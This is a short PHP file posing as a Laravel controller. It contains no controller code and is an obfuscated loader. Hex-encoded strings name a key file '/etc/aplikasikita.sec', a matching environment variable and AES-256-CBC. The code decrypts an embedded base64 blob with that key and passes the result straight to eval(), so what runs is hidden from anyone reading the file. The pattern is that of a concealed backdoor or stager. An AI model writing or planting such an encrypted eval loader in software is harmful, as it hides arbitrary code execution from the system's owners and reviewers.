<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('bl/MdkV8CDmW3PKWve1Kqw==');

$c=base64_decode(

'hmMntHzhaWCxUXp2Kogsvf3/HNYS1d5U7lHI2UPecDHhzDdj519Sky8AiWO8k5OdNfRmfn6KvnAN' .
'8Ivjin/cgvowsvGVQ39gogX8pjD8fAiBsyUGVbP93v5422rtN94waNv/IvXElwX6XbcE7pkrPN04' .
'2HQCzKSILczbvT5B8ygeNxRKFga68Pbyk20biU2f0zi+kEyVrym1Iphcj1HiURZ2wDWkJHFtNvhK' .
'AaxlFMgd5HFKFcTpyoE8aNs+Si7F260dETD76rL9bzAxxdqrRw=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

